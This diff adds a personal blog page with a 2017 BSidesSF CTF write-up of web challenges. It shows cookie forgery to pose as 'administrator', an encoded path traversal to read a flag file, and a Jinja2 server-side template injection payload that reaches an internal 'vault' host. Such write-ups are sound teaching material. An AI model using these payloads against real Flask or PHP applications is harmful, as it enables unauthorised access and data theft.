@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="">
+    <head>
+         
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>BSidesSF - Write Up</title>
+        <style>
+
+    html body {
+        font-family: '', sans-serif;
+        background-color: white;
+    }
+
+    :root {
+        --accent: green;
+        --border-width:  5px ;
+    }
+
+</style>
+
+
+<link rel="stylesheet" href="https://meem67.github.io/blog/css/main.css">
+
+
+
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=">
+
+
+ <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/solarized-dark.min.css"> 
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+ 
+
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+
+     <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/python.min.js"></script>  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/javascript.min.js"></script>  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/assembler.min.js"></script> 
+
+    <script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
+ <meta name="generator" content="Hugo 0.32.4" />
+        
+        
+        
+    </head>
+
+    
+    <script type="text/javascript" async
+      src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+  </script>
+
+    <body>
+        
+        <nav class="navbar navbar-default navbar-fixed-top">
+
+            <div class="container">
+
+                <div class="navbar-header">
+
+                    <a class="navbar-brand visible-xs" href="#">BSidesSF - Write Up</a>
+
+                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+
+                </div>
+
+                <div class="collapse navbar-collapse">
+
+                    
+                        <ul class="nav navbar-nav">
+                            
+                                <li><a href="https://meem67.github.io/blog/">Home</a></li>
+                            
+                                <li><a href="https://meem67.github.io/blog/about">About</a></li>
+                            
+                                <li><a href="https://meem67.github.io/blog/tags/">Tags</a></li>
+                            
+                        </ul>
+                    
+
+                    
+                        <ul class="nav navbar-nav navbar-right">
+                            
+                                <li class="navbar-icon"><a href="mailto:me@example.com"><i class="fa fa-envelope-o"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://github.com/0x23B/"><i class="fa fa-github"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://twitter.com/0x23B/"><i class="fa fa-twitter"></i></a></li>
+                            
+                        </ul>
+                    
+
+                </div>
+
+            </div>
+
+        </nav>
+
+
+<main>
+
+    <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="https://meem67.github.io/blog/posts/ctfs/2017-02-16-bsidessf_writeups/">BSidesSF - Write Up</a></h4>
+    <h5>February 16, 2017</h5>
+    
+    <a href="https://meem67.github.io/blogtags/ctf"><kbd class="item-tag">CTF</kbd></a>
+    
+
+</div>
+
+
+    <br> <div class="text-justify"><p>The BSides San Francisco CTF <a href="https://scoreboard.ctf.bsidessf.com">(<a href="https://scoreboard.ctf.bsidessf.com">https://scoreboard.ctf.bsidessf.com</a>)</a> was held in parallel with the BSides San Francisco conference, lasting from Sunday, 12 Feb. 2017 13:00 CET until Tuesday, 14 Feb. 2017 13:00 CET. It was a fun CTF, where I was focused on Web Challenges.</p>
+
+<p><h2 id="Web">Web</h2>
+<h3 id="easyauth">easyauth</h3>
+Here we face a login page with the hint to login with the credentials guest/guest. Also we are provided the auth.php, where we can see, how the cookies were set. When we scroll down, we can see an if condition, checking the username for &ldquo;administrator&rdquo;</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">if</span>(<span style="color:#960050;background-color:#1e0010">$</span>username <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;administrator&#39;</span>) {
+    <span style="color:#66d9ef">print</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&lt;p&gt;Congratulations, you&#39;re the administrator! Here&#39;s your reward:&lt;/p&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+    <span style="color:#66d9ef">print</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&lt;p&gt;&#34;</span> <span style="color:#f92672">.</span> FLAG <span style="color:#f92672">.</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&lt;/p&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+  } <span style="color:#66d9ef">else</span> {
+    <span style="color:#66d9ef">print</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&lt;p&gt;It&#39;s cool that you logged in, but unfortunately we can only give the flag to &#39;administrator&#39;. :(&lt;/p&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+}</code></pre></div>
+
+<p>Changing the cookie to auth=username%3Dadministrator%26date%3D2017-02-13T12%3A19%3A03%2B0000%26 and reloading the page brings us the flag:
+FLAG:0076ecde2daae415d7e5ccc7db909e7e</p>
+
+<h3 id="Zumbo1">Zumbo1</h3>
+Looking at the source code reveals a comment at the bottom:
+
+<!- page: index.template, src: /code/server.py ->
+
+So we are typing server.py in the address field and get the python source:
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> flask<span style="color:#f92672">,</span> sys<span style="color:#f92672">,</span> os
+<span style="color:#f92672">import</span> requests
+
+app <span style="color:#f92672">=</span> flask<span style="color:#f92672">.</span>Flask(__name__)
+counter <span style="color:#f92672">=</span> <span style="color:#ae81ff">12345672</span>
+
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;/&lt;path:page&gt;&#39;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">custom_page</span>(page):
+    <span style="color:#66d9ef">if</span> page <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;favicon.ico&#39;</span>: <span style="color:#66d9ef">return</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;</span>
+    <span style="color:#66d9ef">global</span> counter
+    counter <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+    <span style="color:#66d9ef">try</span>:
+        template <span style="color:#f92672">=</span> open(page)<span style="color:#f92672">.</span>read()
+    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+        template <span style="color:#f92672">=</span> str(e)
+    template <span style="color:#f92672">+=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;!-- page: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">, src: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> --&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (page, __file__)
+    <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>render_template_string(template, name<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;test&#39;</span>, counter<span style="color:#f92672">=</span>counter);
+
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;/&#39;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">home</span>():
+    <span style="color:#66d9ef">return</span> flask<span style="color:#f92672">.</span>redirect(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;/index.template&#39;</span>);
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;__main__&#39;</span>:
+    flag1 <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;FLAG: FIRST_FLAG_WASNT_HARD&#39;</span>
+    <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;/flag&#39;</span>) <span style="color:#66d9ef">as</span> f:
+            flag2 <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+    flag3 <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;http://vault:8080/flag&#39;</span>)<span style="color:#f92672">.</span>text
+
+    <span style="color:#66d9ef">print</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;Ready set go!&#34;</span>
+    sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
+    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;0.0.0.0&#34;</span>)</code></pre></div>
+
+Here you can directly see the first flag.
+flag1 = 'FLAG: FIRST_FLAG_WASNT_HARD'
+
+<h3 id="Zumbo2">Zumbo2</h3>
+The second flag is stored in a file named 'flag'
+As we are currently in directory "/code" we have to go up to the parent folder typing ".." in the address field. As this will be escaped, we try with encoding: "%2E%2E%2Fflag" -> "../flag"
+
+FLAG: RUNNER_ON_SECOND_BASE
+
+<h3 id="Zumbo3">Zumbo3</h3>
+
+<p>This one is a bit trickier to solve. We know from the source code, that flag #3 is at a different location, namely <a href="http://vault:8080/flag">http://vault:8080/flag</a>. We also know already, that the application we are facing is using the flask framework. So we search for flask vulnerabilities and get a list with &ldquo;Injecting Flask&rdquo; and so &ldquo;Server Side Template Injection&rdquo;.</p>
+
+<p>As we have control over the &lsquo;page&rsquo; variable imported by the &lsquo;custom_page&rsquo; method, we can inject python code into it. Typing {{ 1+1 }} will be displayed as 2. So we have a solid basis, for exploiting this. In this <a href="https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/">blog</a> we see, that using the payload {{&ldquo;.<strong>class</strong>.mro()[2].<strong>subclasses</strong>()}} reveals all used classes in the application. The basic idea is to use a string type and go up in the inheritance hierarchy to the root object using the class mro. Now we just have to search for a useable class and finish the exploit.</p>
+
+<p>A short snip of the used classes:
+
+<figure >
+    
+        <img src="https://meem67.github.io/blog/images/bsidessf_ctf_zumbo_3_1.jpg" />
+    
+    
+</figure>
+</p>
+
+<p>Looking around in this list, we see the class &lsquo;requests.packages.urllib3.connection.HTTPConnection&rsquo; at index 341. Great! The next part was to get familiar with jinja template to build a proper payload. I was trying around with setting variables and displaying them again with</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>B<span style="color:#f92672">%</span><span style="color:#ae81ff">25</span> set counter<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">25</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>D<span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>B<span style="color:#f92672">%</span><span style="color:#ae81ff">25</span> set counter<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">%</span><span style="color:#ae81ff">25</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>D{{counter}}</code></pre></div>
+
+
+<figure >
+    
+        <img src="https://meem67.github.io/blog/images/bsidessf_ctf_zumbo_3_2.jpg" />
+    
+    
+</figure>
+
+
+<p>which after two hours resultet in the following load:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>B<span style="color:#f92672">%</span><span style="color:#ae81ff">25</span> set c<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>mro()[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">341</span>](<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;vault:8080&#39;</span>) <span style="color:#f92672">%</span><span style="color:#ae81ff">25</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>D<span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>B<span style="color:#f92672">%</span><span style="color:#ae81ff">25</span> set r<span style="color:#f92672">=</span>c<span style="color:#f92672">.</span>request(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;GET&#39;</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;/flag&#39;</span>) <span style="color:#f92672">%</span><span style="color:#ae81ff">25</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>D{{c<span style="color:#f92672">.</span>getresponse()<span style="color:#f92672">.</span>read()}}</code></pre></div>
+
+<p>As &lsquo;c.request&rsquo; returns nothing, I don&rsquo;t really understand, why I needed to store the result in a variable, but that was the point, where I had to spent a couple of minutes.</p>
+
+
+<figure >
+    
+        <img src="https://meem67.github.io/blog/images/bsidessf_ctf_zumbo_3_3.jpg" />
+    
+    
+</figure>
+
+</div>
+
+    
+    
+
+    
+
+    
+
+</main>
+
+        <footer>
+
+            <p class="copyright text-muted">&copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a></p>
+
+        </footer>
+       
+    </body>
+
+</html>
+
